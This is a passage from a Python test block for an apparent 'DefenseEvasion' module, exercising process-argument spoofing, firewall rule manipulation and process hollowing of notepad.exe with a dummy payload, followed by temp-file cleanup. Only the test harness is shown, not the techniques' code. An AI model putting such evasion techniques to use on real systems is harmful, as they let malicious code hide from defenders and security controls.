            "spoofed_command": "legitimate_process -config important.cfg" 
        }}}
        arg_spoof_res = evasion_module.run_evasion(arg_spoof_req)
        print(json.dumps(arg_spoof_res, indent=2))
        
        # Check if the mock execution was successful for the script
        script_exec_status = arg_spoof_res.get("results",{})\
                                      .get("argument_spoofing",{})\
                                      .get("details",{})\
                                      .get("execution_result",{})\
                                      .get("status", "failure")
        print(f"  Arg Spoofing reported script execution status: {script_exec_status}")
        print(f"  Check manually if '{real_cmd_out}' was created by the simulation.")
        if real_cmd_out.exists():
             print(f"  (File '{real_cmd_out}' found, removing)")
             real_cmd_out.unlink()

        print("\n--- Test Firewall Manipulation (Add - Simulated Perm Error) ---")
        fw_add_req = {"evade": {"technique": "firewall_manipulation", "details": {
             "action": "add", "rule_name": "TestAllowHTTP", "port": 80
        }}}
        fw_add_res = evasion_module.run_evasion(fw_add_req)
        print(json.dumps(fw_add_res, indent=2))

        print("\n--- Test Firewall Manipulation (Delete - Simulated) ---")
        fw_del_req = {"evade": {"technique": "firewall_manipulation", "details": {
             "action": "delete", "rule_name": "TestAllowHTTP"
        }}}
        fw_del_res = evasion_module.run_evasion(fw_del_req)
        print(json.dumps(fw_del_res, indent=2))
        
        # Test Process Hollowing (Windows Only)
        if platform.system() == "Windows":
             payload_file = tmp_dir / "dummy_payload.bin"
             payload_file.write_bytes(b"\xcc\xc3") # int3, ret (simple breakpoint payload)
             print(f"\n--- Test Process Hollowing (Win) - Target: notepad.exe ---")
             hollow_req = {"evade": {"technique": "process_hollowing", "details": {
                 "target_executable": "C:\\Windows\\System32\\notepad.exe", # Standard safe target
                 "payload_path": str(payload_file)
             }}}
             hollow_res = evasion_module.run_evasion(hollow_req)
             print(json.dumps(hollow_res, indent=2))
             if payload_file.exists(): payload_file.unlink()

    except Exception as main_err:
        print(f"\n*** Error during testing block: {main_err} ***", file=sys.stderr)
        logger.error("Error in __main__ test block", exc_info=True)

    finally:
        # Cleanup
        print("\n--- Cleaning up test files ---")
        files_to_clean = [test_file, mimic_file, hidden_test_file, 
                          tmp_dir / "real_cmd_output.txt", 
                          tmp_dir / "dummy_payload.bin"]
        for p in files_to_clean:
             # Check type before unlinking
             if p.exists() and p.is_file():
                  try:
                       p.unlink()
                       print(f"Removed: {p}")
                  except OSError as e:
                       print(f"Error removing {p}: {e}") 

# End of DefenseEvasion class
